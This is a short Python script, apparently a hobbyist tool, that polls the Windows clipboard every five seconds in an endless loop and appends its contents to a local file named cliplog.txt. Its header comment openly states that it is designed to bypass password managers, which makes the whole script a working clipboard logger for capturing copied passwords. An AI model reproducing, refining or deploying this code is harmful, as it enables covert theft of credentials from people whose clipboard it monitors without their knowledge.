# This piece of scripts runs and copy clip text and saves it to cliplog.txt
# It is designed to byepass password managers

import win32clipboard
import time

while  True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    # save 'data' to txt
    with open('cliplog.txt', 'a+') as f:
        f.write(data + '\n')
    time.sleep(5)
    